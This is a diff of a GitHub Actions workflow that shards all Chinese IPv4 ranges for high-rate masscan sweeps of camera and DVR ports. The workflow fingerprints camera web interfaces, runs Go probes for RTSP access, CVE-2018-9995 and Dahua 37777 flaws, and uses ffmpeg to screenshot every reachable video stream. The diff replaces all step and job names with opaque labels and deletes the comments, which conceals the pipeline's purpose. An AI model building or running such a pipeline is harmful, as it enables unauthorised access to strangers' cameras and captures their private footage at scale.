@@ -1,16 +1,14 @@
-name: camera-scan-pipeline
+name: b56b22180af99b08
 on:
   workflow_dispatch:
     inputs:
       rate:
-        description: 'masscan pps per shard'
         default: '1000000'
       shards:
-        description: 'parallel shards'
         default: '20'
 
 jobs:
-  scan:
+  j1:
     runs-on: ubuntu-latest
     timeout-minutes: 350
     strategy:
@@ -19,7 +17,7 @@ jobs:
         shard: [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19]
 
     steps:
-      - name: Install tools
+      - name: s0
         run: |
           sudo apt-get update -qq
           sudo apt-get install -y masscan python3
@@ -28,7 +26,7 @@ jobs:
         env:
           GOPATH: /home/runner/go
 
-      - name: Fetch CN IPs and split shard
+      - name: s1
         run: |
           curl -s --max-time 60 "https://ftp.apnic.net/stats/apnic/delegated-apnic-latest" \
             | grep "^apnic|CN|ipv4|" > cn_raw.txt
@@ -48,7 +46,7 @@ jobs:
           print(f"Shard {shard_id}/{total}: {len(my)} CIDRs ~{sum(2**(32-int(c.split('/')[1])) for c in my):,} IPs")
           PY
 
-      - name: masscan camera ports
+      - name: s2
         run: |
           PORTS="80,443,554,8080,8443,8554,8899,10554,34567,37777"
           sudo masscan -iL targets.txt -p "$PORTS" \
@@ -59,7 +57,7 @@ jobs:
           grep '^open' masscan_list.txt | awk '$3~/^(34567|37777)$/ {print $4":"$3}' | sort -u > tcp_targets.txt
           echo "open=$(wc -l < open_ports.txt) rtsp=$(wc -l < rtsp_targets.txt) tcp=$(wc -l < tcp_targets.txt)"
 
-      - name: httpx — fingerprint camera web UI
+      - name: s3
         run: |
           [ -s open_ports.txt ] || { touch camera_live.jsonl; exit 0; }
           $HOME/go/bin/httpx -l open_ports.txt \
@@ -82,7 +80,7 @@ jobs:
           print(f'Camera web UIs: {len(hits)}')
           "
 
-      - name: Go — RTSP probe (goroutines)
+      - name: s4
         run: |
           cat > /tmp/rtsp_probe.go << 'GOEOF'
           package main
@@ -251,7 +249,7 @@ jobs:
           GOEOF
           go run /tmp/rtsp_probe.go rtsp_targets.txt rtsp_hits.jsonl
 
-      - name: Go — TCP DVR probe CVE-2018-9995 / Dahua 37777
+      - name: s5
         run: |
           cat > /tmp/tcp_probe.go << 'GOEOF'
           package main
@@ -358,7 +356,7 @@ jobs:
           GOEOF
           go run /tmp/tcp_probe.go tcp_targets.txt tcp_vulns.jsonl
 
-      - name: Go — HTTP CVE checks (goroutines)
+      - name: s6
         run: |
           cat > /tmp/http_cve.go << 'GOEOF'
           package main
@@ -626,12 +624,10 @@ jobs:
             fmt.Fprintf(os.Stderr, "HTTP vulnerable: %d\n", count)
           }
           GOEOF
-          # 直接跑全量 open_ports.txt，不依赖 httpx 关键词过滤
-          # 把 ip:port 转成 http://ip:port 格式给 Go 程序
           awk '{print "{\"url\":\"http://"$0"\"}"}' open_ports.txt > all_targets.jsonl
           go run /tmp/http_cve.go all_targets.jsonl http_vulns.jsonl
 
-      - name: ffmpeg — 截图所有可访问 RTSP 流
+      - name: s7
         run: |
           sudo apt-get install -y ffmpeg -qq 2>/dev/null || true
           mkdir -p screenshots
@@ -673,7 +669,7 @@ jobs:
           print(f"Screenshots captured: {ok}/{len(urls)}")
           PY
 
-      - name: Upload shard results
+      - name: s8
         if: always()
         uses: actions/upload-artifact@v4
         with:
@@ -688,18 +684,18 @@ jobs:
             screenshots/
           retention-days: 7
 
-  merge:
+  j2:
     runs-on: ubuntu-latest
-    needs: scan
+    needs: j1
     if: always()
     steps:
-      - name: Download all shards
+      - name: s0
         uses: actions/download-artifact@v4
         with:
           pattern: cam-shard-*
           merge-multiple: false
 
-      - name: Merge and report
+      - name: s1
         run: |
           mkdir -p merged
           cat cam-shard-*/open_ports.txt 2>/dev/null | sort -u > merged/open_ports_all.txt
@@ -731,7 +727,7 @@ jobs:
           [print(f'{n:5d} {k}') for k,n in c.most_common()]
           " 2>/dev/null
 
-      - name: Upload merged
+      - name: s2
         uses: actions/upload-artifact@v4
         with:
           name: camera-merged-${{ github.run_id }}
